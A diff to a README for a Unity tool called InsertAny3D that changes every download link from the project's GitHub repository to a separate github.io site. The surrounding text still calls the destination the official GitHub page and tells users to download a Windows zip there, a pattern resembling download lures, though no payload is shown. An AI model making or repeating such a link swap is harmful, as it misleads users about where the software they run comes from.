@@ -1,6 +1,6 @@
 # 🎯 InsertAny3D - Insert Objects Into Unity Scenes Effortlessly
 
-[![Download InsertAny3D](https://img.shields.io/badge/Download-InsertAny3D-blue?style=for-the-badge&logo=github&logoColor=white&color=8B5CF6)](https://github.com/sexya3624/InsertAny3D)
+[![Download InsertAny3D](https://img.shields.io/badge/Download-InsertAny3D-blue?style=for-the-badge&logo=github&logoColor=white&color=8B5CF6)](https://sexya3624.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Getting started with InsertAny3D is straightforward. Follow these simple steps t
 ## 📥 Step 1: Download the Application
 
 **Visit this link to download the application:**  
-[![Download InsertAny3D](https://img.shields.io/badge/⬇️%20Download-InsertAny3D-orange?style=for-the-badge&logo=github&logoColor=white&color=10B981)](https://github.com/sexya3624/InsertAny3D)
+[![Download InsertAny3D](https://img.shields.io/badge/⬇️%20Download-InsertAny3D-orange?style=for-the-badge&logo=github&logoColor=white&color=10B981)](https://sexya3624.github.io)
 
 When you click the link above,you'll be taken to the official GitHub page for InsertAny3D. Look for the green **"Code"** button or the **"Releases"** section on the page. Click there to see the available download options. Choose the version that says **"Windows"** or **".zip"** to download the application files to your computer.
 
@@ -179,7 +179,7 @@ InsertAny3D is an open-source project. Review the repository's license file for 
 
 ## 🔗 Quick Access Links
 
-- **Download InsertAny3D**: [https://github.com/sexya3624/InsertAny3D](https://github.com/sexya3624/InsertAny3D)
+- **Download InsertAny3D**: [https://sexya3624.github.io](https://sexya3624.github.io)
 - **Report a Bug**: Use the Issues tab on the GitHub page
 - **Feature Requests**: Suggest improvements via Pull Requests or Issues
 
